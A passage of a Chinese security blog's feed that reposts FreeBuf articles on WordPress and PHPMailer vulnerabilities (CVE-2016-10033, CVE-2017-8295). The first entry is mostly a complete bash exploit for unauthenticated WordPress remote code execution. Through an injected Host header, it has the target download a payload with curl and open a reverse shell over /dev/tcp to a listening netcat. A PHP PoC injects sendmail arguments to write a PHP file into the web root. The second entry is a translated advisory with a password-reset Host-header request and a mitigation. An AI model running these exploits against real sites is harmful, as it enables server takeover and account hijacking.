vulns/exploitation?</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># .;lc&apos;</span><br><span class="line"># .,cdkkOOOko;.</span><br><span class="line"># .,lxxkkkkOOOO000Ol&apos;</span><br><span class="line"># .&apos;:oxxxxxkkkkOOOO0000KK0x:&apos;</span><br><span class="line"># .;ldxxxxxxxxkxl,.&apos;lk0000KKKXXXKd;.</span><br><span class="line"># &apos;:oxxxxxxxxxxo;. .:oOKKKXXXNNNNOl.</span><br><span class="line"># &apos;&apos;;ldxxxxxdc,. ,oOXXXNNNXd;,.</span><br><span class="line"># .ddc;,,:c;. ,c: .cxxc:;:ox:</span><br><span class="line"># .dxxxxo, ., ,kMMM0:. ., .lxxxxx:</span><br><span class="line"># .dxxxxxc lW. oMMMMMMMK d0 .xxxxxx:</span><br><span class="line"># .dxxxxxc .0k.,KWMMMWNo :X: .xxxxxx:</span><br><span class="line"># .dxxxxxc .xN0xxxxxxxkXK, .xxxxxx:</span><br><span class="line"># .dxxxxxc lddOMMMMWd0MMMMKddd. .xxxxxx:</span><br><span class="line"># .dxxxxxc .cNMMMN.oMMMMx&apos; .xxxxxx:</span><br><span class="line"># .dxxxxxc lKo;dNMN.oMM0;:Ok. &apos;xxxxxx:</span><br><span class="line"># .dxxxxxc ;Mc .lx.:o, Kl &apos;xxxxxx:</span><br><span class="line"># .dxxxxxdl;. ., .. .;cdxxxxxx:</span><br><span class="line"># .dxxxxxxxxxdc,. &apos;cdkkxxxxxxxx:</span><br><span class="line"># .&apos;:oxxxxxxxxxdl;. .;lxkkkkkxxxxdc,.</span><br><span class="line"># .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.</span><br><span class="line"># .&apos;:oxxxxxxxxx.ckkkkkkkkxl,.</span><br><span class="line"># .,cdxxxxx.ckkkkkxc.</span><br><span class="line"># .&apos;:odx.ckxl,.</span><br><span class="line"># .,.&apos;.</span><br><span class="line">#</span><br><span class="line"># https://ExploitBox.io</span><br><span class="line">#</span><br><span class="line"># https://twitter.com/Exploit_Box</span><br><span class="line">#</span><br><span class="line"># -----------------------------------------------------------------</span><br><span class="line">rev_host=&quot;192.168.57.1&quot;</span><br><span class="line">function prep_host_header() &#123;</span><br><span class="line">cmd=&quot;$1&quot;</span><br><span class="line">rce_cmd=&quot;\$&#123;run&#123;$cmd&#125;&#125;&quot;;</span><br><span class="line"># replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;</span><br><span class="line">#sed &apos;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&apos;</span><br><span class="line">rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^/^\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\$spool_directory&#125;&#125;^g&apos;`&quot;</span><br><span class="line"># replace &apos; &apos; (space) with</span><br><span class="line">#sed &apos;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&apos;</span><br><span class="line">rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^ ^\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\$tod_log&#125;&#125;^g&apos;`&quot;</span><br><span class="line">#return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;</span><br><span class="line">host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;</span><br><span class="line">return 0</span><br><span class="line">&#125;</span><br><span class="line">#cat exploitbox.ans</span><br><span class="line">intro=&quot;</span><br><span class="line">DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r</span><br><span class="line">bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f</span><br><span class="line">G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c</span><br><span class="line">G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg</span><br><span class="line">IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f</span><br><span class="line">IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f</span><br><span class="line">X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6</span><br><span class="line">b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb</span><br><span class="line">NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N</span><br><span class="line">TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1</span><br><span class="line">QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz</span><br><span class="line">NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g</span><br><span class="line">G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54</span><br><span class="line">eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb</span><br><span class="line">WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO</span><br><span class="line">TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg</span><br><span class="line">ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb</span><br><span class="line">MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD</span><br><span class="line">G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob</span><br><span class="line">WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz</span><br><span class="line">NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb</span><br><span class="line">MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f</span><br><span class="line">X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4</span><br><span class="line">bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;</span><br><span class="line">intro2=&quot;</span><br><span class="line">ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09</span><br><span class="line">fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb</span><br><span class="line">MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE</span><br><span class="line">aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09</span><br><span class="line">fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg</span><br><span class="line">ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh</span><br><span class="line">bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt</span><br><span class="line">ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp</span><br><span class="line">bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1</span><br><span class="line">cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;</span><br><span class="line">echo &quot;$intro&quot; | base64 -d</span><br><span class="line">echo &quot;$intro2&quot; | base64 -d</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">echo -e &quot;Usage:\n$0 target-wordpress-url\n&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line">target=&quot;$1&quot;</span><br><span class="line">echo -ne &quot;\e[91m[*]\033[0m&quot;</span><br><span class="line">read -p &quot; Sure you want to get a shell on the target &apos;$target&apos; ? [y/N] &quot; choice</span><br><span class="line">echo</span><br><span class="line">if [ &quot;$choice&quot; == &quot;y&quot; ]; then</span><br><span class="line">echo -e &quot;\e[92m[*]\033[0m Guess I can&apos;t argue with that... Let&apos;s get started...\n&quot;</span><br><span class="line">echo -e &quot;\e[92m[+]\033[0m Connected to the target&quot;</span><br><span class="line"># Serve payload/bash script on :80</span><br><span class="line">RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;</span><br><span class="line">echo &quot;$RCE_exec_cmd&quot; &gt; rce.txt</span><br><span class="line">python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;</span><br><span class="line">hpid=$!</span><br><span class="line"># Save payload on the target in /tmp/rce</span><br><span class="line">cmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;</span><br><span class="line">prep_host_header &quot;$cmd&quot;</span><br><span class="line">curl -H&quot;Host: $host_header&quot; -s -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpassword</span><br><span class="line">echo -e &quot;\n\e[92m[+]\e[0m Payload sent successfully&quot;</span><br><span class="line"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span><br><span class="line">cmd=&quot;/bin/bash /tmp/rce&quot;</span><br><span class="line">prep_host_header &quot;$cmd&quot;</span><br><span class="line">curl -H&quot;Host: $host_header&quot; -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpassword &amp;</span><br><span class="line">echo -e &quot;\n\e[92m[+]\033[0m Payload executed!&quot;</span><br><span class="line">echo -e &quot;\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n&quot;</span><br><span class="line">nc -vv -l 1337</span><br><span class="line">echo</span><br><span class="line">else</span><br><span class="line">echo -e &quot;\e[92m[+]\033[0m Responsible choice ;)  Exiting.\n&quot;</span><br><span class="line">exit 0</span><br><span class="line">fi</span><br><span class="line">echo &quot;Exiting...&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p>上述另外一个最新曝出编号为CVE-2017-8295的漏洞，严重程度被评级为介于Medium和High之间（而非Critical），影响到WordPress Core &lt;= 4.7.4以下的版本。</p><p>这个漏洞的概况是这样的：WordPress有个密码重置功能，该特性中存在漏洞——在某些情况下可能导致攻击者在无需身份认证的情况下拿到密码重置链接，这样一来攻击者就能获取目标用户的WordPress账户了。</p><p>这个漏洞源于WordPress默认在创建密码重置邮件的时候，采用不受信任的数据。具体的利用方式点击这里查看。目前WordPress官方暂无针对该问题的解决方案，可以采用如下临时解决方案：</p><p>用户可启用UserCanonicalName实施静态SERVER_NAME值</p><p><a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname</a></p><p>据作者所说，该问题已经向WordPress安全团队进行过多次反馈，最早一次是在去年7月份，但一直没有得到相应的反馈。</p><p>【2016.12.27原文】</p><p>这次曝出远程代码执行漏洞的是堪称全球最流行邮件发送类的PHPMailer，据说其全球范围内的用户量大约有900万——每天还在持续增多。</p><p>GitHub上面形容PHPMailer“可能是全球PHP发送邮件最流行的代码。亦被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等”。所以这个漏洞影响范围还是比较广的，漏洞级别也为Critical最高级。</p><p>漏洞编码</p><p>CVE-2016-10033</p><p>影响版本</p><p>PHPMailer &lt;  5.2.18</p><p>漏洞级别</p><p>高危</p><p>漏洞描述</p><p>独立研究人员Dawid Golunski发现了该漏洞——远程攻击者利用该漏洞，可实现远程任意代码在web服务器账户环境中执行，并使web应用陷入威胁中。攻击者主要在常见的web表单如意见反馈表单，注册表单，邮件密码重置表单等使用邮件发送的组件时利用此漏洞。</p><p>不过有关该漏洞的细节信息，研究人员并未披露，期望给予网站管理员更多的时间来升级PHPMailer类，避免受漏洞影响。    </p><p>漏洞PoC</p><p>实际上Dawid Golunski已经做了个可行的RCE PoC，不过会迟一些再发布。关注视频PoC请点击：<a href="https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html" target="_blank" rel="noopener">https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html</a></p><p>更新：PoC代码已经公布，请站长们尽快升级！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">更新：PoC代码已经公布，请站长们尽快升级！</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">/* </span><br><span class="line">PHPMailer &lt; 5.2.18 Remote Code Execution (CVE-2016-10033) </span><br><span class="line">A simple PoC (working on Sendmail MTA) </span><br><span class="line">It will inject the following parameters to sendmail command: </span><br><span class="line">Arg no. 0 == [/usr/sbin/sendmail] </span><br><span class="line">Arg no. 1 == [-t] </span><br><span class="line">Arg no. 2 == [-i] </span><br><span class="line">Arg no. 3 == [-fattacker\] </span><br><span class="line">Arg no. 4 == [-oQ/tmp/] </span><br><span class="line">Arg no. 5 == [-X/var/www/cache/phpcode.php] </span><br><span class="line">Arg no. 6 == [some&quot;@email.com] </span><br><span class="line">which will write the transfer log (-X) into /var/www/cache/phpcode.php file. </span><br><span class="line">The resulting file will contain the payload passed in the body of the msg: </span><br><span class="line">09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306 </span><br><span class="line">09607 &lt;&lt;&lt; Content-Type: text/html; charset=us-ascii </span><br><span class="line">09607 &lt;&lt;&lt; </span><br><span class="line">09607 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt; </span><br><span class="line">09607 &lt;&lt;&lt; </span><br><span class="line">09607 &lt;&lt;&lt; </span><br><span class="line">09607 &lt;&lt;&lt; </span><br><span class="line">09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306-- </span><br><span class="line">See the full advisory URL for details. </span><br><span class="line">*/ </span><br><span class="line">// Attacker&apos;s input coming from untrusted source such as $_GET , $_POST etc. </span><br><span class="line">// For example from a Contact form </span><br><span class="line">$email_from = &apos;&quot;attacker\&quot; -oQ/tmp/ -X/var/www/cache/phpcode.php  some&quot;@email.com&apos;; </span><br><span class="line">$msg_body  = &quot;&lt;?php phpinfo(); ?&gt;&quot;; </span><br><span class="line">// ------------------ </span><br><span class="line">// mail() param injection via the vulnerability in PHPMailer </span><br><span class="line">require_once(&apos;class.phpmailer.php&apos;); </span><br><span class="line">$mail = new PHPMailer(); // defaults to using php &quot;mail()&quot; </span><br><span class="line">$mail-&gt;SetFrom($email_from, &apos;Client Name&apos;); </span><br><span class="line">$address = &quot;customer_feedback@company-X.com&quot;; </span><br><span class="line">$mail-&gt;AddAddress($address, &quot;Some User&quot;); </span><br><span class="line">$mail-&gt;Subject    = &quot;PHPMailer PoC Exploit CVE-2016-10033&quot;; </span><br><span class="line">$mail-&gt;MsgHTML($msg_body); </span><br><span class="line">if(!$mail-&gt;Send()) &#123; </span><br><span class="line">echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">echo &quot;Message sent!\n&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞修复</p><p>更新到5.2.18：<a href="https://github.com/PHPMailer/PHPMailer" target="_blank" rel="noopener">https://github.com/PHPMailer/PHPMailer</a></p><p>漏洞详情目前已经提交给了PHPMailer官方——官方也已经发布了PHPMailer 5.2.18紧急安全修复，解决上述问题，受影响的用户应当立即升级。详情可参见：</p><p><a href="https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md" target="_blank" rel="noopener">https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md</a></p><p><a href="https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md" target="_blank" rel="noopener">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a></p><p>*本文转自FreeBuf.COM    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;【2017-5-4更新】&quot;&gt;&lt;a href=&quot;#【2017-5-4更新】&quot; class=&quot;headerlink&quot; title=&quot;【2017.5.4更新】&quot;&gt;&lt;/a&gt;【2017.5.4更新】&lt;/h2&gt;&lt;p&gt;昨天曝出了两个比较热门的漏洞，一个是CVE-2016-100
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WordPress" scheme="http://blog.unixmen.cn/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>WordPress爆未经授权的密码重置漏洞</title>
    <link href="http://blog.unixmen.cn/2017/05/05/WordPress%E7%88%86%E6%9C%AA%E7%BB%8F%E6%8E%88%E6%9D%83%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.unixmen.cn/2017/05/05/WordPress爆未经授权的密码重置漏洞/</id>
    <published>2017-05-05T01:14:35.000Z</published>
    <updated>2017-05-05T01:28:24.672Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>漏洞提交者：Dawid Golunski<br>漏洞编号：CVE-2017-8295<br>发布日期：2017-05-03<br>修订版本：1.0<br>漏洞危害：中/高</p></blockquote><h2 id="I-漏洞"><a href="#I-漏洞" class="headerlink" title="I. 漏洞"></a>I. 漏洞</h2><p>WordPress内核&lt;= 4.7.4存在未经授权的密码重置(0day)</p><h2 id="II-背景"><a href="#II-背景" class="headerlink" title="II. 背景"></a>II. 背景</h2><p>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。截止2017年2月，Alexa排名前1000万的站点中约有27.5%使用该管理系统。据报道有超过6000万站点使用WordPress进行站点管理或者作为博客系统。</p><h2 id="III-介绍"><a href="#III-介绍" class="headerlink" title="III. 介绍"></a>III. 介绍</h2><p>WordPress的重置密码功能存在漏洞，在某些情况下不需要使用之前的身份令牌验证获取密码重置链接。<br>该攻击可导致攻击者在未经授权的情况下获取用户Wordpress后台管理权限。</p><h2 id="IV-描述"><a href="#IV-描述" class="headerlink" title="IV. 描述"></a>IV. 描述</h2><p>该漏洞源于WordPress默认使用不可信的数据。当生成一个密码重置邮件时应当是仅发送给与帐户相关联的电子邮件。<br>从下面的代码片段可以看出，在调用PHP mail()函数前创建了一个From email头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">------[ wp-includes/pluggable.php ]------</span><br><span class="line"></span><br><span class="line">if ( !isset( $from_email ) ) &#123;</span><br><span class="line">        // Get the site domain and get rid of www.</span><br><span class="line">        $sitename = strtolower( $_SERVER[&apos;SERVER_NAME&apos;] );</span><br><span class="line">        if ( substr( $sitename, 0, 4 ) == &apos;www.&apos; ) &#123;</span><br><span class="line">                $sitename = substr( $sitename, 4 );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $from_email = &apos;wordpress@&apos; . $sitename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------------</span><br></pre></td></tr></table></figure><p>正如我们所看到的，Wordpress为了生成重置邮件创建的一个From/Return-Path(发件人/收件人)头，使用SERVER_NAME变量以获取服务器的主机名。<br>然而，诸如Apache的主流web服务器默认使用由客户端提供的主机名来设置SERVER_NAME变量（<a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="noopener">参考Apache文档</a>）<br>由于SERVER_NAME可以进行修改，攻击者可以任意设置该值，例如attackers-mxserver.com<br>这将导致Wordpress的$from_email变为<a href="mailto:wordpress@attackers-mxserver.com" target="_blank" rel="noopener">wordpress@attackers-mxserver.com</a>，最终导致包含From/Return-Path(发件人/收件人)设置的密码重置邮件发送到了该恶意邮件地址。<br>至于攻击者可以修改哪那一封电子邮件的头信息，这取决于服务器环境（<a href="http://php.net/manual/en/function.mail.php" target="_blank" rel="noopener">参考PHP文档</a>）<br>基于邮件服务器的配置，可能导致被修改过邮件头的恶意收件人/发件人地址的电子邮件发送给WordPress用户。<br>这使得攻击者能够在不需要进行交互就可以截取本该是需要进行交互才能进行的操作的密码重置邮件。</p><blockquote><p>攻击场景：<br>如果攻击者知道用户的电子邮件地址。为了让密码重置邮件被服务器拒收，或者无法到达目标地址。他们可以先对用户的电子邮件帐户进行DoS攻击（通过发送多个超过用户磁盘配额的大文件邮件或攻击该DNS服务器）<br>某些自动回复可能会附加有邮件发送副本<br>发送多封密码重置邮件给用户，迫使用户对这些没完没了的密码重置邮件进行回复，回复中就包含的密码链接会发送给攻击者。</p></blockquote><h2 id="V-POC"><a href="#V-POC" class="headerlink" title="V. POC"></a>V. POC</h2><p>如果攻击者将类似下面的请求发送到默认可通过IP地址访问的Wordpress安装页面(IP-based vhost):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----[ HTTP Request ]----</span><br><span class="line"></span><br><span class="line">POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1</span><br><span class="line">Host: injected-attackers-mxserver.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password</span><br></pre></td></tr></table></figure></p><hr><p>WordPress将触发管理员账户的密码重置功能<br>由于修改了主机头，SERVER_NAME变量将被设置为攻击者所选择的主机名，因此Wordpress会将以下电子邮件头信息和正文传递给/usr/bin/sendmail<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------[ resulting e-mail ]-----</span><br><span class="line"></span><br><span class="line">Subject: [CompanyX WP] Password Reset</span><br><span class="line">Return-Path: &lt;wordpress@attackers-mxserver.com&gt;</span><br><span class="line">From: WordPress &lt;wordpress@attackers-mxserver.com&gt;</span><br><span class="line">Message-ID: &lt;e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com&gt;</span><br><span class="line">X-Priority: 3</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br></pre></td></tr></table></figure></p><p>有人请求将以下账户的密码进行重置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://companyX-wp/wp/wordpress/</span><br><span class="line">Username: admin</span><br></pre></td></tr></table></figure></p><p>如果是弄错了，直接忽略该邮件就好。重置密码请访问以下地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://companyx-wp/wp/wordpress/wp-login.php?action=rp&amp;key=AceiMFmkMR4fsmwxIZtZ&amp;login=admin%3E</span><br></pre></td></tr></table></figure></p><p>正如我们看到的，Return-Path, From, 以及Message-ID字段都是攻击者控制的域<br>通过bash脚本替换/usr/sbin/sendmail以执行头的验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cat &gt; /tmp/outgoing-email</span><br></pre></td></tr></table></figure></p><h2 id="VI-业务影响"><a href="#VI-业务影响" class="headerlink" title="VI. 业务影响"></a>VI. 业务影响</h2><p>在利用成功的基础上，攻击者可重置用户密码并且未经授权获取WordPress账户访问权限。</p><h2 id="VII-系统影响"><a href="#VII-系统影响" class="headerlink" title="VII. 系统影响"></a>VII. 系统影响</h2><p>WordPress至最新版本4.7.4全部受影响</p><h2 id="VIII-解决方案"><a href="#VIII-解决方案" class="headerlink" title="VIII. 解决方案"></a>VIII. 解决方案</h2><p>目前没有官方解决方案可用。作为临时解决方案，用户可以启用UseCanonicalName执行SERVER_NAME静态值（<a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="noopener">参考Apache</a>）</p><h2 id="IX-参考文献"><a href="#IX-参考文献" class="headerlink" title="IX. 参考文献"></a>IX. 参考文献</h2><p><a href="https://legalhackers.com" target="_blank" rel="noopener">https://legalhackers.com</a></p><p><a href="https://ExploitBox.io" target="_blank" rel="noopener">https://ExploitBox.io</a></p><p>Vendor site:</p><p><a href="https://wordpress.org" target="_blank" rel="noopener">https://wordpress.org</a></p><p><a href="http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="noopener">http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname</a></p><p><a href="http://php.net/manual/en/function.mail.php" target="_blank" rel="noopener">http://php.net/manual/en/function.mail.php</a></p><p><a href="https://tools.ietf.org/html/rfc5321" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc5321</a></p><blockquote><p>转自FreeBuf.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;漏洞提交者：Dawid Golunski&lt;br&gt;漏洞编号：CVE-2017-8295&lt;br&gt;发布日期：2017-05-03&lt;br&gt;修订版本：1.0&lt;br&gt;漏洞危害：中/高&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;I-漏洞&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WordPress" scheme="http://blog.unixmen.cn/tags/WordPress/"/>
    
  </entry>
  
